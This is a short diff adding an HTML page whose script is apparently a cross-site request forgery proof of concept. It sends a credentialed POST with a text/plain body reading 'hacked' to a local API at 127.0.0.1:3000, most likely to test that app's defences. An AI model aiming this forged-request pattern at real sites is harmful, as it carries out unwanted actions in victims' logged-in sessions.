@@ -1,0 +1,18 @@
+<script>
+  let url = "http://127.0.0.1:3000/api/message";
+
+  fetch(url, {
+    method: "POST",
+	body: JSON.stringify({"msg":"hacked"}),
+    credentials: "include",
+	headers: {
+      'Content-Type': 'text/plain'
+    },
+  })
+  .then((resp) => resp.json())
+  .then(function (data) {
+  
+    console.log(data);
+	
+  });
+</script>
